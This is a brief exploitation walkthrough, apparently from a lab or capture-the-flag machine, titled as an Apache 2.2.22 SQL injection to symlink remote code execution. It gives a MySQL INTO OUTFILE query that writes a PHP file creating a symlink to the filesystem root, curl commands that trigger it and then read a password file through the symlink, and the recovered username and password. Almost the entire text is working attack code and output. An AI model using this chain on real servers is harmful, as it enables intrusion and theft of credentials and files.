# Apache 2.2.22 + SQLi → Symlink RCE Exploitation

## 1 — SQL Injection to write the PHP payload

```sql
SELECT '<?php symlink("/", "search.php"); echo "OK"; ?>'
INTO OUTFILE '/var/www/forum/templates_c/test3.php'
FIELDS TERMINATED BY '' ENCLOSED BY '' ESCAPED BY ''
LINES TERMINATED BY '';
```

---

### Payload execution
```bash
curl -ks "https://192.168.56.101/forum/templates_c/test3.php"
# Expected response: OK
```

---

### Reading the sensitive file
```bash
curl -ks "https://192.168.56.101/forum/templates_c/search.php/home/LOOKATME/password"
# → lmezard:G!@M6f4Eatau{sF"
```